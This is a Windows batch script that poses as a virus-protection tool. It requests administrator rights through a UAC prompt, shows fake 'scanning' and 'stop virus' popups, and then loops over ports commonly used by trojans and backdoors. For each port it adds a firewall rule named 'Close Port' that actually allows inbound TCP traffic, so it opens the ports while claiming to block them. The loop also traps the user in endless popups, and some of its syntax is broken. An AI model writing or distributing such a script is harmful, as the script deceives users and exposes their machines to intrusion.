@echo off
:getadmin
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------   
cd %temp%
powershell -WindowStyle Hidden -Command "& {}"
echo x=msgbox("scanning.........." ,0, "Protect virus is running") > Realtimecheck.vbs 
start Realtimecheck.vbs powershell -WindowStyle Hidden -Command "& {}"
timeout 3 /nobreak
taskkill /IM wscript.exe
timeout 1 /nobreak

:next
echo x=msgbox("not safety" ,0, "Protect virus is running") > Realtime.vbs 
start Realtime.vbs 
tasklist | find /i "wscript.exe"
if %errorlevel% neq 0 goto next
goto virus
:virus
echo [ Found ] Kill All BAD Port...
timeout 2.1 /nobreak > nul
for %%a in (
21
23
31
80
113
135
139
445
666
1001
1026
1080
1170
1234
1243
1363
1364
1368
1373
1377
1433
1434
1981
2001
2023
2140
2283
2535
2745
2989
3024
3127
3128
3131
3150
3410
3700
4000
4444
4950
5554
6346
6400
6667
6670
6969
7597
7626
7777
8012
8866
10000
10048
10080
10100
11000
12345
12346
12349
16660
17300
18006
18753
20034
20432
21544
22222
23432
27374
27665
30100
31337
31338
31339
33270
33567
33568
40421
44444
60008
64666
65000
65506
) do (
netsh advfirewall firewall show rule name="Close Port %%a" > nul
if %errorlevel% 1 (
echo x=msgbox("stop virus" ,0, "Protect virus is running") > Realtime.vbs 
start Realtime.vbs 
netsh advfirewall firewall add rule name="Close Port %%a" dir=in action=allow protocol=TCP localport=%%a & goto virus
) else (
echo x=msgbox("safety" ,0, "Protect virus is running") > Realtime.vbs 
start Realtime.vbs & goto virus
)
)